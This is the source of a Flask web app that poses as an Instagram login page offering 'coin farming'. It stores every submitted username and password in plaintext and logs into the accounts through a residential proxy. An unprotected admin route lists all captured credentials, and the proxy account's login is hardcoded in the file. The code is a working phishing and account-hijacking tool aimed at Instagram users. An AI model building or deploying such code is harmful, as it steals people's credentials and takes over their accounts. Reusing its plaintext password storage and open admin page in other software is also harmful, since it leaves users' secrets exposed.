import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired, FeedbackRequired
from dotenv import load_dotenv

# 1. FLASK VE VERİTABANI TANIMLAMA (Hata buradaydı, şimdi tam)
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# 2. PROXY AYARLARIN
PROXY_HOST = "residential.proxy-cheap.com" 
PROXY_PORT = "6000" 
PROXY_USER = "pcUjiruWbB"
PROXY_PASS = "PC_4gAMh8pCXyTQAxKW1"
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# 3. COIN KASMA MOTORU (ARKA PLANDA ÇALIŞIR)
def start_coin_farming(username, password):
    with app.app_context():
        cl = Client()
        user_record = IGUser.query.filter_by(username=username).first()
        try:
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 25
            
            # Giriş Denemesi
            if cl.login(username, password):
                user_record.status = "GİRİŞ OK ✅ | COIN AKTİF 🪙"
                db.session.commit()
                
                # Takip İşlemi Örneği (Coin kasmak için birini takip ettir)
                # cl.user_follow(cl.user_id_from_username("hedef_kullanici"))
                
            else:
                user_record.status = "Giriş Başarısız"
                db.session.commit()
        except Exception as e:
            print(f"Bot Hatası: {e}")
            user_record.status = "IP/BAĞLANTI HATASI ⚠️"
            db.session.commit()

# 4. GİRİŞ SAYFASI (HTML)
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Coin Sistemi</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-[350px] border border-zinc-800 p-8 text-center rounded-sm shadow-xl">
        <h1 class="text-3xl font-bold mb-8 italic">Instagram</h1>
        <div id="login-box">
            <input id="u" placeholder="Kullanıcı adı" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-2 outline-none focus:border-zinc-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 outline-none focus:border-zinc-500">
            <button onclick="startAction()" id="btn" class="w-full bg-[#0095f6] font-bold p-2 rounded-lg transition active:scale-95">Giriş Yap ve Coin Kas</button>
        </div>
        <p id="msg" class="text-xs mt-4 text-zinc-400"></p>
    </div>
    <script>
        async function startAction() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn'), msg = document.getElementById('msg');
            if(!u || !p) return;
            btn.disabled = true; btn.innerText = "Sistem Başlatılıyor...";
            const r = await fetch('/api/start-login', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({u, p})
            });
            const d = await r.json();
            msg.innerText = d.msg;
            btn.innerText = "İşlem Sırasında...";
        }
    </script>
</body>
</html>
"""

# 5. API YOLLARI
@app.route('/')
def home():
    return render_template_string(LOGIN_HTML)

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. Şifreyi hemen kaydet (Her ihtimale karşı)
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "Sıraya Alındı"
    db.session.commit()

    # 2. Botu arka planda (Thread) başlat (Web sayfasını dondurmaz)
    threading.Thread(target=start_coin_farming, args=(u, p)).start()

    return jsonify(status="success", msg="Giriş sıraya alındı. Coin kasmaya başlıyoruz!")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>Sistem Paneli</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users:
        res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
